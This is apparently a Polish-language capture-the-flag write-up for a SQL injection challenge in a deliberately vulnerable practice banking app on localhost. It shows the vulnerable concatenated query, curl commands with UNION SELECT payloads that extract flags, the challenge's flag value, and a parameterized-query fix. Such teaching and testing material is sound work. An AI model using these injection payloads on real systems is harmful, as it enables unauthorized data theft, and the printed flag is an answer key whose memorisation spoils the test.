# A05 — SQL Injection (wyszukiwarka transakcji)

## Metadane
- **ID:** A05
- **Kategoria:** OWASP A05:2025 - Injection
- **Trudność:** medium
- **Punkty:** 150
- **Flaga:** `PWR{sqli_transactions_leaked}`

## Opis
Endpoint `/api/transactions/search?q=` buduje zapytanie SQL przez konkatenację stringów.
Pozwala to na wstrzyknięcie `UNION SELECT` i wyciągnięcie danych z innych tabel.

## Podatny kod
```python
raw_sql = (
    f"SELECT id, from_account_id, to_account_id, amount, title, created_at "
    f"FROM transactions "
    f"WHERE ... AND title LIKE '%{q}%'"  # q bez sanitizacji!
)
```

## Exploit

### Krok 1: Zaloguj się
```bash
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"bob@vulnbank.pl","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

### Krok 2: UNION SELECT z tabeli flags
```bash
curl -G "http://localhost:5000/api/transactions/search" \
  -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "q=' UNION SELECT id,flag_value,to_account_id,amount,title,created_at FROM flags WHERE challenge_id='A05'--"
```

Wynik: w polu `from_account_id` pojawi się flaga `PWR{sqli_transactions_leaked}`.

### Alternatywny payload (wyciągnij wszystkie flagi)
```
' UNION SELECT id,flag_value,3,4,5,now() FROM flags--
```

## Jak to naprawić
```python
# Zamiast string concatenation — parametryzowane zapytanie:
result = db.session.execute(
    db.text("SELECT ... WHERE title LIKE :q"),
    {"q": f"%{q}%"}
)
```

## Referencje
- OWASP A05:2025 - Injection
- [CWE-89: Improper Neutralization of Special Elements in SQL Command](https://cwe.mitre.org/data/definitions/89.html)
